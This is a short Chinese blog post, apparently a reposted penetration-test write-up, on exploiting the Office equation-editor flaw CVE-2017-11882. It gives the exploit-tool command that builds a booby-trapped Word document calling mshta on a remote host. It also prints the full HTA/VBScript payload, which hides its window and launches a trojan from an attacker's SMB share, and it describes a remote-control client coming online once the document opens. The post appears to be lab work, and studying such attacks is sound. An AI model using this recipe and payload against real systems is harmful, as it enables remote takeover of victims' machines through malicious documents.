# 利用 cve-2017-11882 的一次渗透测试 - admin-神风 - 博客园

> 原文：[`www.cnblogs.com/wh4am1/p/10142744.html`](https://www.cnblogs.com/wh4am1/p/10142744.html)

利用工具：[`github.com/Ridter/CVE-2017-11882/`](https://github.com/Ridter/CVE-2017-11882/ "https://github.com/Ridter/CVE-2017-11882/")

 影响版本：
office 2003
office 2007
office 2010
office 2013
office 2016

一、思路整理

![](img/37949d727c6e42025f386e87d24e2c34.png)

整体思路如上，通过执行远程的 flag.txt 里包含的 hta 格式文件，去执行共享文件夹下的 muma.exe，最终导致机器被沦陷

二、实际操作

这里操作需要用到之前 GitHub 上下载的 py 文件

```
Command109b_CVE-2017-11882.py -c "mshta http://10.20.38.138/flag.txt" -o test.doc

```

 最后会在程序目录下生成一个 test.doc

最后在 10.20.38.138 主机上开启 web 服务就行

flag.txt 文件如下

```
<HTML> 

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<HEAD> 

<script language="VBScript"> Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000

Set objShell = CreateObject("Wscript.Shell")

objShell.Run "cmd.exe /c start \\10.20.38.138\share\ma.exe" self.close </script>

<body> demo </body>

</HEAD> 

</HTML>
```

 其中 objShell.Run 执行的就是启动一个进程，进程的目录就是\\10.20.38.138\share\ma.exe

切记，开启共享文件夹时候，要把密码登录给去掉，不然其他机器无法访问到共享文件夹

最后用远控生成一个 ma.exe 放到共享文件夹下就 OK 了

三、上线测试

直接在虚拟机 XP 上打开 doc 文件

随后会发现远控端上线了

![](img/62671b83f325e97767ed77a6c350ac97.png)